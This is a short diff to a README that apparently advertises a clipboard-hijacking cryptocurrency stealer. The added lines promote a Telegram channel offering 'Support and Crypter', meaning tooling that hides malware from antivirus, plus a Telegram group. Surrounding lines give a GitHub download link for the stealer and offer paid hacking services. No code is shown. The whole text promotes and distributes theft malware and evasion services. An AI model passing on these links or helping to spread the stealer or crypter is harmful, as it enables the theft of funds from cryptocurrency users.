@@ -38,6 +38,10 @@ Use this as a starting point—or “borrow” one. 😉
 
 ⚠️ Use with caution. ⚠️
 
+🔗 💾 Support and Crypter : https://t.me/HitmanDrain
+
+🔗 💾 Telegram Group : https://t.me/+XHrMPhjiudU0NmYx
+
 🔗 💾 Donwload Link : https://github.com/HitmanTools/Clipboard-web3-stealer
 
 🔗 🛍️ Hire my services in the description.
